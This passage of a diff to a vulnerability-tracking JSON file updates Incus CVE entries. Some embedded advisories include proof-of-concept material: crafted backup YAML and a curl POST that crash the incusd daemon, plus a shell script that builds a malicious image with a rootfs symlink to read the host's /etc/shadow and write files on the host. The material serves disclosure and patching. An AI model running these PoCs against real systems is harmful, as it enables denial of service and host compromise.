             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "[Unknown description]",
-                "description": "[Unknown description]",
+                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload in github.com/lxc/incus",
+                "description": "Incus has an arbitrary file write via path traversal in S3 multipart upload in github.com/lxc/incus",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1007,8 +1007,8 @@
             },
             "CVE-2026-48755": {
                 "cve_id": "CVE-2026-48755",
-                "title": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
-                "description": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1020,8 +1020,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7)",
-                "description": "## Summary\n\n`(*backend).CreateCustomVolumeFromBackup` in [`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/internal/server/storage/backend.go) contains an unguarded `*time.Time` dereference on the `ExpiresAt` field of every volume-snapshot entry in an imported custom-volume backup. An authenticated user with `can_create_storage_volumes` permission on any project can crash the `incusd` daemon by uploading a backup tarball whose `volume_snapshots[*].expires_at` field is absent.\n\nThis is a sibling-field variant of GHSA-r7w7-mmxr-47r9 (CVE-2026-40197). Commit `985a1dedf9f3e7ba729c93b654905ed510de25c2` added `if s == nil` at the top of the loop body, but did not guard the adjacent `*snapshot.ExpiresAt` deref 19 lines later. Every other consumer of `Config.VolumeSnapshots[i].ExpiresAt` in this same file already gates the deref with a nil-check \u2014 the asymmetric guard is the bug.\n\n## Vulnerable code\n\n[`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/internal/server/storage/backend.go), `CreateCustomVolumeFromBackup`:\n\n```go\n// Line 7710-7714 \u2014 the parent fix from GHSA-r7w7\nfor _, s := range srcBackup.Config.VolumeSnapshots {\n    if s == nil {\n        return errors.New(\"Bad snapshot definition found in index\")\n    }\n    snapshot := s\n    snapName := snapshot.Name\n    // ...\n    // Line 7731 \u2014 UNGUARDED *time.Time deref:\n    err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description,\n        snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt,\n        *snapshot.ExpiresAt,   // <-- panics when expires_at omitted in YAML\n        snapVol.ContentType(), true, true)\n```\n\n`ExpiresAt` is declared `*time.Time` (`shared/api/storage_pool_volume_snapshot.go:21,88`). Every other consumer in the same file already uses the safe pattern:\n\n| Line | Code | Guarded? |\n|------|------|----------|\n| 909-910 | `CreateInstanceFromBackup` | YES |\n| 1134-1135 | refresh path | YES |\n| 1422-1423 | migration path | YES |\n| **7731** | **`CreateCustomVolumeFromBackup`** | **NO** |\n\n## Reach\n\n1. Attacker is an authenticated client (TLS cert, OIDC, or unix socket) with the `can_create_storage_volumes` entitlement on any project. Same auth gate as parent GHSA-r7w7.\n2. `POST /1.0/storage-pools/<pool>/volumes/custom` with `Content-Type: application/octet-stream` and `X-Incus-name: <name>`.\n3. Body is a tar containing [`backup/index.yaml`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backup/index.yaml) with `type: custom`, a non-nil `volume:` block, and `volume_snapshots: [{name: snap0}]` (no `expires_at` field).\n4. `cmd/incusd/storage_volumes.go:storagePoolVolumesPost` -> `backup.GetInfo` parses the yaml -> `pool.CreateCustomVolumeFromBackup` -> the `s == nil` guard at 7712 passes (snapshot pointer is non-nil) -> `*snapshot.ExpiresAt` on line 7731 panics on the nil `*time.Time`.\n5. No `recover()` is installed in the operation runner, so the panic kills the entire `incusd` process. Repeated POSTs are a persistent denial of service.\n\nMinimal [`backup/index.yaml`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backup/index.yaml):\n\n```yaml\nname: poc-vol\nbackend: dir\npool: default\ntype: custom\noptimized: false\noptimized_header: false\nsnapshots: [snap0]\nconfig:\n  volume: {name: poc-vol, type: custom, content_type: filesystem, config: {}}\n  volume_snapshots:\n    - name: snap0\n      description: snap0\n      config: {}\n      # expires_at intentionally omitted\n```\n\n## Proof of concept (end-to-end against running daemon)\n\nBundled in the report: `make_backup.sh` + the resulting 479-byte `poc-vol.tar.gz`.\n\nTested against `incus 7.0.0` (zabbly latest GA at time of report; build `1:0~ubuntu24.04~202605201355`) inside a privileged Ubuntu 24.04 container with the default `dir` storage pool.\n\n```bash\n$ curl -s --unix-socket /var/lib/incus/unix.socket -X POST \\\n    --data-binary @/tmp/poc-vol.tar.gz \\\n    -H 'Content-Type: application/octet-stream' \\\n    -H 'X-Incus-name: poc-vol' \\\n    http://incus/1.0/storage-pools/default/volumes/custom\n{\"type\":\"async\",\"status\":\"Operation created\",\"status_code\":100,...}\n\n$ ps -ef | grep incusd | grep -v grep    # process is GONE\n```\n\nDaemon panic from `/tmp/incus.out`:\n\n```\npanic: runtime error: invalid memory address or nil pointer dereference\n[signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x162b938]\n\ngoroutine 422 [running]:\ngithub.com/lxc/incus/v7/internal/server/storage.(*backend).CreateCustomVolumeFromBackup(...)\n    /build/incus/internal/server/storage/backend.go:7731 +0xb48\nmain.createStoragePoolVolumeFromBackup.func7(...)\n    /build/incus/cmd/incusd/storage_volumes.go:2915 +0x290\ngithub.com/lxc/incus/v7/internal/server/operations.(*Operation).Start.func1(...)\n    /build/incus/internal/server/operations/operations.go:307 +0x2c\ncreated by github.com/lxc/incus/v7/internal/server/operations.(*Operation).Start in goroutine 408\n    /build/incus/internal/server/operations/operations.go:306 +0x168\n```\n\nStack frame [`backend.go:7731`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backend.go#L7731) is the literal `*snapshot.ExpiresAt` line. Same line in v6.0.x LTS is [`backend.go:7271`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backend.go#L7271) (also panics; v6.0.x additionally lacks the `s == nil` parent fix so a single nil snapshot pointer also panics there).\n\n## Impact\n\n- **Severity:** denial of service against the entire `incusd` process. Every container / VM / storage operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until an operator restarts the process.\n- **Privileges required:** any authenticated user with `can_create_storage_volumes` on any project. Not behind the admin tier.\n- **Network attack surface:** the Incus REST API on `:8443` or the unix socket.\n- **CWE-476** \u2014 Nil-Pointer Dereference. **CVSS estimate:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).\n\n## Suggested fix\n\nMirror the guard pattern already in use at lines 909-910 / 1134-1135 / 1422-1423:\n\n```diff\n--- a/internal/server/storage/backend.go\n+++ b/internal/server/storage/backend.go\n@@ -7728,9 +7728,14 @@ func (b *backend) CreateCustomVolumeFromBackup(...) error {\n         snapVol := b.GetVolume(drivers.VolumeTypeCustom, drivers.ContentType(srcBackup.Config.Volume.ContentType), snapVolStorageName, snapshot.Config)\n\n         // Validate config and create database entry for new storage volume.\n         // Strip unsupported config keys (in case the export was made from a different type of storage pool).\n-        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, *snapshot.ExpiresAt, snapVol.ContentType(), true, true)\n+        var snapExpiryDate time.Time\n+        if snapshot.ExpiresAt != nil {\n+            snapExpiryDate = *snapshot.ExpiresAt\n+        }\n+\n+        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, snapExpiryDate, snapVol.ContentType(), true, true)\n         if err != nil {\n             return err\n         }\n```\n\n## Reporter notes\n\nReported via Privately-Reported Vulnerability against `lxc/incus` by tonghuaroot.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1046,8 +1046,8 @@
             },
             "CVE-2026-55621": {
                 "cve_id": "CVE-2026-55621",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -1059,8 +1059,8 @@
             },
             "CVE-2026-55622": {
                 "cve_id": "CVE-2026-55622",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -1451,8 +1451,8 @@
             },
             "CVE-2026-47753": {
                 "cve_id": "CVE-2026-47753",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted)",
+                "description": "## Summary\n\n`(*backend).CreateInstanceFromBackup` in [`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go) contains a nil-pointer dereference that an authenticated user with permission to create instances in any project can trigger remotely by uploading a crafted backup tarball. The Incus daemon panics and the process crashes, causing denial of service to every project on that cluster member.\n\nThis is a sibling of `GHSA-fwj8-62r8-8p8m`, `GHSA-r7w7-mmxr-47r9`, and `GHSA-x5r6-jr56-89pv` (all assigned 2026-05-04). Those patches added guards on adjacent fields of the same `backup/config.Config` struct; the `Volume` field on the instance-import path was missed.\n\n## Vulnerable code\n\n[`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go) (current `main`, commit `1513600`):\n\n```go\n// Lines 763-767 \u2014 properly guarded:\nvar volumeConfig map[string]string\nif srcBackup.Config != nil && srcBackup.Config.Volume != nil {\n    volumeConfig = srcBackup.Config.Volume.Config\n}\n\n// ... a few lines later ...\n\n// Line 795 \u2014 unguarded, dereferences Config.Volume directly:\nif srcBackup.Config.Volume.Config[\"block.type\"] == drivers.BlockVolumeTypeQcow2 {\n```\n\nThe caller `createFromBackup` in [`cmd/incusd/instances_post.go`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go) only verifies that `Config` and `Config.Container` are non-nil:\n\n```go\n// instances_post.go:854\nif bInfo.Config == nil || bInfo.Config.Container == nil {\n    return response.BadRequest(errors.New(\"Backup file is missing required information\"))\n}\n```\n\n`Volume` is not checked. The `Volume` field on `internal/server/backup/config.Config` has type `*api.StorageVolume` with `yaml:\"volume,omitempty\"`, so omitting `volume:` from a crafted [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml) decodes to `nil`. The subsequent unguarded deref on line 795 panics.\n\nThe panic happens on the HTTP request goroutine; no `recover()` is installed by `CreateInstanceFromBackup` or its callers, so the Go runtime kills the entire `incusd` process.\n\n## Reach\n\n1. The attacker is any client authenticated to the Incus REST API (TLS client certificate, OIDC, or unix socket) with permission to create instances in at least one project. This is the most common low-trust authenticated user.\n2. The attacker sends `POST /1.0/instances?project=<p>` with `Content-Type: application/octet-stream`.\n3. The body is an uncompressed tar (the same code path also accepts squashfs / gz / zstd / xz) containing one file, [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml), whose `config:` block lists `container:` and `pool:` but omits `volume:`.\n4. [`cmd/incusd/instances_post.go`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go) `instancesPost` -> `createFromBackup` -> the line 854 guard passes (Container is non-nil) -> `pool.CreateInstanceFromBackup(*bInfo, backupFile, nil)` -> [`internal/server/storage/backend.go:795`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go#L795) panics on `srcBackup.Config.Volume.Config[...]`.\n5. `incusd` process dies. All running operations on that cluster member are killed. Repeated requests = persistent denial of service.\n\nMinimal crafted [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml):\n\n```yaml\nname: poc\nbackend: dir\npool: default\ntype: container\noptimized: false\noptimized_header: false\nconfig:\n  container:\n    name: poc\n    architecture: x86_64\n    type: container\n  pool:\n    name: default\n    driver: dir\n  # volume intentionally absent\n```\n\n## Proof of concept\n\nA self-contained Go unit test imports the real `internal/server/backup/config` package, decodes the crafted YAML into the actual `*backupConfig.Config` struct used by the daemon, and executes the literal expression from [`backend.go:795`](https://github.com/lxc/incus/blob/1513600/backend.go#L795). The test is intentionally inert (panics are recovered and reported as the expected outcome):\n\n```go\n// internal/poc_repro/poc_nil_deref_volume_test.go\nfunc TestPoCNilDerefVolumeImport(t *testing.T) {\n    var bi pocInfo // mirrors internal/server/backup.Info, only Config is needed\n    loader, _ := yaml.NewLoader(strings.NewReader(evilIndex))\n    _ = loader.Load(&bi)\n\n    // bi.Config != nil, bi.Config.Container != nil (passes createFromBackup guard)\n    // bi.Config.Volume == nil (passes the line 765 guard's else branch)\n\n    defer func() { _ = recover() }()\n\n    // Literal copy of backend.go:795.\n    if bi.Config.Volume.Config[\"block.type\"] == \"qcow2\" {\n        // unreachable\n    }\n}\n```\n\nResult against `lxc/incus@1513600` on Go 1.26.1:\n\n```\n=== RUN   TestPoCNilDerefVolumeImport\n    poc_nil_deref_volume_test.go:97: yaml decoded: Container != nil (passes createFromBackup guard), Volume == nil\n    poc_nil_deref_volume_test.go:99: backend.go line 795 unguarded deref about to execute...\n    poc_nil_deref_volume_test.go:123: CONFIRMED: nil-pointer panic at the exact line as backend.go:795 => runtime error: invalid memory address or nil pointer dereference\n--- PASS: TestPoCNilDerefVolumeImport (0.00s)\n```\n\nA tarball builder + uploader (`main.go`) is included in the report's PoC bundle. The tarball is 2560 bytes and contains a single 547-byte [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml).\n\n## Impact\n\n- **Severity:** denial of service against the entire `incusd` process. Every container / VM operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until the process is restarted by an operator or supervisor.\n- **Privileges required:** authenticated user with `can_create` permission on any project. The path is not behind the admin auth tier.\n- **Network attack surface:** the Incus REST API on `:8443` (or unix socket).\n- **CWE-476** \u2014 nil pointer dereference. **CVSS estimate:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).\n\n## Suggested fix\n\nMirror the guard already present on line 765 a few lines higher into the path that hits line 795. For example:\n\n```go\nif srcBackup.Config == nil || srcBackup.Config.Volume == nil {\n    return nil, nil, errors.New(\"Backup config missing required volume metadata\")\n}\n\nif srcBackup.Config.Volume.Config[\"block.type\"] == drivers.BlockVolumeTypeQcow2 {\n```\n\nAlternatively, extend the existing `createFromBackup` precondition in [`cmd/incusd/instances_post.go:854`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go#L854) to also reject backups missing `bInfo.Config.Volume`. The latter is the smaller surface change and matches the pattern of `CreateBucketFromBackup` ([`backend.go:7848`](https://github.com/lxc/incus/blob/1513600/backend.go#L7848)):\n\n```go\nif srcBackup.Config == nil || srcBackup.Config.Bucket == nil {\n    return errors.New(\"Valid bucket config not found in index\")\n}\n```\n\n## Reporter notes\n\nReported via Privately-Reported Vulnerability against `lxc/incus`. Reporter: tonghuaroot. The reproducer test is non-destructive (no network, no filesystem mutation beyond the temp directory used by Go's test runner) and recovers the panic.",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -1464,8 +1464,8 @@
             },
             "CVE-2026-48749": {
                 "cve_id": "CVE-2026-48749",
-                "title": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image in github.com/lxc/incus",
-                "description": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image in github.com/lxc/incus",
+                "title": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image",
+                "description": "### Summary\n\nA specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nIncus validates an image as soon as it sees a normal `metadata.yaml` and a `rootfs/` entry, but full extraction can later process a duplicate top-level `rootfs` symlink. Later, the stopped-container file API opens `d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to it.\n\n```\nmetadata.yaml\nrootfs/\nrootfs -> /\n```\n\nIn practice, this allows a malicious actor to access the host's filesystem with root privileges.\n\n\n### PoC\n\nBelow, we map the container's rootfs to `/` on the host, but it can be mapped anywhere. We then retrieve the host's `/etc/shadow` file and create a file in `/`.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC rootfs symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar\n\n# inject rootfs symlink\nrmdir rootfs\nln -s / rootfs\ntar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs\n\n\nincus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink\nincus init afrw-rootfs-symlink afrw-rootfs-symlink\n\n\n# read\nincus file pull afrw-rootfs-symlink/etc/shadow \"${tmpdir}/shadow\"\ncat \"${tmpdir}/shadow\"\n\n# write\nprintf 'afrw-rootfs-symlink\\n' >\"${tmpdir}/afrw-rootfs-symlink\"\nincus file push \"${tmpdir}/afrw-rootfs-symlink\" afrw-rootfs-symlink/\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1477,19 +1477,6 @@
             },
             "CVE-2026-48750": {
                 "cve_id": "CVE-2026-48750",
-                "title": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
-                "description": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
-                "severity": "CRITICAL",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "0:6.0.2-1",
-                        "fixed": "0:6.0.4-2+deb13u8"
-                    }
-                ]
-            },
-            "CVE-2026-48751": {
-                "cve_id": "CVE-2026-48751",
                 "title": "Title Not Available",
                 "description": "Description Not Available",
                 "severity": "CRITICAL",
@@ -1501,10 +1488,23 @@
                     }
                 ]
             },
+            "CVE-2026-48751": {
+                "cve_id": "CVE-2026-48751",
+                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "severity": "CRITICAL",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "0:6.0.2-1",
+                        "fixed": "0:6.0.4-2+deb13u8"
+                    }
+                ]
+            },
             "CVE-2026-48752": {
                 "cve_id": "CVE-2026-48752",
-                "title": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
-                "description": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1516,8 +1516,8 @@
             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "[Unknown description]",
-                "description": "[Unknown description]",
+                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload in github.com/lxc/incus",
+                "description": "Incus has an arbitrary file write via path traversal in S3 multipart upload in github.com/lxc/incus",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1542,8 +1542,8 @@
             },
             "CVE-2026-48755": {
                 "cve_id": "CVE-2026-48755",
-                "title": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
-                "description": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1555,8 +1555,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7)",
-                "description": "## Summary\n\n`(*backend).CreateCustomVolumeFromBackup` in [`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/internal/server/storage/backend.go) contains an unguarded `*time.Time` dereference on the `ExpiresAt` field of every volume-snapshot entry in an imported custom-volume backup. An authenticated user with `can_create_storage_volumes` permission on any project can crash the `incusd` daemon by uploading a backup tarball whose `volume_snapshots[*].expires_at` field is absent.\n\nThis is a sibling-field variant of GHSA-r7w7-mmxr-47r9 (CVE-2026-40197). Commit `985a1dedf9f3e7ba729c93b654905ed510de25c2` added `if s == nil` at the top of the loop body, but did not guard the adjacent `*snapshot.ExpiresAt` deref 19 lines later. Every other consumer of `Config.VolumeSnapshots[i].ExpiresAt` in this same file already gates the deref with a nil-check \u2014 the asymmetric guard is the bug.\n\n## Vulnerable code\n\n[`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/internal/server/storage/backend.go), `CreateCustomVolumeFromBackup`:\n\n```go\n// Line 7710-7714 \u2014 the parent fix from GHSA-r7w7\nfor _, s := range srcBackup.Config.VolumeSnapshots {\n    if s == nil {\n        return errors.New(\"Bad snapshot definition found in index\")\n    }\n    snapshot := s\n    snapName := snapshot.Name\n    // ...\n    // Line 7731 \u2014 UNGUARDED *time.Time deref:\n    err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description,\n        snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt,\n        *snapshot.ExpiresAt,   // <-- panics when expires_at omitted in YAML\n        snapVol.ContentType(), true, true)\n```\n\n`ExpiresAt` is declared `*time.Time` (`shared/api/storage_pool_volume_snapshot.go:21,88`). Every other consumer in the same file already uses the safe pattern:\n\n| Line | Code | Guarded? |\n|------|------|----------|\n| 909-910 | `CreateInstanceFromBackup` | YES |\n| 1134-1135 | refresh path | YES |\n| 1422-1423 | migration path | YES |\n| **7731** | **`CreateCustomVolumeFromBackup`** | **NO** |\n\n## Reach\n\n1. Attacker is an authenticated client (TLS cert, OIDC, or unix socket) with the `can_create_storage_volumes` entitlement on any project. Same auth gate as parent GHSA-r7w7.\n2. `POST /1.0/storage-pools/<pool>/volumes/custom` with `Content-Type: application/octet-stream` and `X-Incus-name: <name>`.\n3. Body is a tar containing [`backup/index.yaml`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backup/index.yaml) with `type: custom`, a non-nil `volume:` block, and `volume_snapshots: [{name: snap0}]` (no `expires_at` field).\n4. `cmd/incusd/storage_volumes.go:storagePoolVolumesPost` -> `backup.GetInfo` parses the yaml -> `pool.CreateCustomVolumeFromBackup` -> the `s == nil` guard at 7712 passes (snapshot pointer is non-nil) -> `*snapshot.ExpiresAt` on line 7731 panics on the nil `*time.Time`.\n5. No `recover()` is installed in the operation runner, so the panic kills the entire `incusd` process. Repeated POSTs are a persistent denial of service.\n\nMinimal [`backup/index.yaml`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backup/index.yaml):\n\n```yaml\nname: poc-vol\nbackend: dir\npool: default\ntype: custom\noptimized: false\noptimized_header: false\nsnapshots: [snap0]\nconfig:\n  volume: {name: poc-vol, type: custom, content_type: filesystem, config: {}}\n  volume_snapshots:\n    - name: snap0\n      description: snap0\n      config: {}\n      # expires_at intentionally omitted\n```\n\n## Proof of concept (end-to-end against running daemon)\n\nBundled in the report: `make_backup.sh` + the resulting 479-byte `poc-vol.tar.gz`.\n\nTested against `incus 7.0.0` (zabbly latest GA at time of report; build `1:0~ubuntu24.04~202605201355`) inside a privileged Ubuntu 24.04 container with the default `dir` storage pool.\n\n```bash\n$ curl -s --unix-socket /var/lib/incus/unix.socket -X POST \\\n    --data-binary @/tmp/poc-vol.tar.gz \\\n    -H 'Content-Type: application/octet-stream' \\\n    -H 'X-Incus-name: poc-vol' \\\n    http://incus/1.0/storage-pools/default/volumes/custom\n{\"type\":\"async\",\"status\":\"Operation created\",\"status_code\":100,...}\n\n$ ps -ef | grep incusd | grep -v grep    # process is GONE\n```\n\nDaemon panic from `/tmp/incus.out`:\n\n```\npanic: runtime error: invalid memory address or nil pointer dereference\n[signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x162b938]\n\ngoroutine 422 [running]:\ngithub.com/lxc/incus/v7/internal/server/storage.(*backend).CreateCustomVolumeFromBackup(...)\n    /build/incus/internal/server/storage/backend.go:7731 +0xb48\nmain.createStoragePoolVolumeFromBackup.func7(...)\n    /build/incus/cmd/incusd/storage_volumes.go:2915 +0x290\ngithub.com/lxc/incus/v7/internal/server/operations.(*Operation).Start.func1(...)\n    /build/incus/internal/server/operations/operations.go:307 +0x2c\ncreated by github.com/lxc/incus/v7/internal/server/operations.(*Operation).Start in goroutine 408\n    /build/incus/internal/server/operations/operations.go:306 +0x168\n```\n\nStack frame [`backend.go:7731`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backend.go#L7731) is the literal `*snapshot.ExpiresAt` line. Same line in v6.0.x LTS is [`backend.go:7271`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backend.go#L7271) (also panics; v6.0.x additionally lacks the `s == nil` parent fix so a single nil snapshot pointer also panics there).\n\n## Impact\n\n- **Severity:** denial of service against the entire `incusd` process. Every container / VM / storage operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until an operator restarts the process.\n- **Privileges required:** any authenticated user with `can_create_storage_volumes` on any project. Not behind the admin tier.\n- **Network attack surface:** the Incus REST API on `:8443` or the unix socket.\n- **CWE-476** \u2014 Nil-Pointer Dereference. **CVSS estimate:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).\n\n## Suggested fix\n\nMirror the guard pattern already in use at lines 909-910 / 1134-1135 / 1422-1423:\n\n```diff\n--- a/internal/server/storage/backend.go\n+++ b/internal/server/storage/backend.go\n@@ -7728,9 +7728,14 @@ func (b *backend) CreateCustomVolumeFromBackup(...) error {\n         snapVol := b.GetVolume(drivers.VolumeTypeCustom, drivers.ContentType(srcBackup.Config.Volume.ContentType), snapVolStorageName, snapshot.Config)\n\n         // Validate config and create database entry for new storage volume.\n         // Strip unsupported config keys (in case the export was made from a different type of storage pool).\n-        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, *snapshot.ExpiresAt, snapVol.ContentType(), true, true)\n+        var snapExpiryDate time.Time\n+        if snapshot.ExpiresAt != nil {\n+            snapExpiryDate = *snapshot.ExpiresAt\n+        }\n+\n+        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, snapExpiryDate, snapVol.ContentType(), true, true)\n         if err != nil {\n             return err\n         }\n```\n\n## Reporter notes\n\nReported via Privately-Reported Vulnerability against `lxc/incus` by tonghuaroot.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1581,8 +1581,8 @@
             },
             "CVE-2026-55621": {
                 "cve_id": "CVE-2026-55621",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -1594,8 +1594,8 @@
             },
             "CVE-2026-55622": {
                 "cve_id": "CVE-2026-55622",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
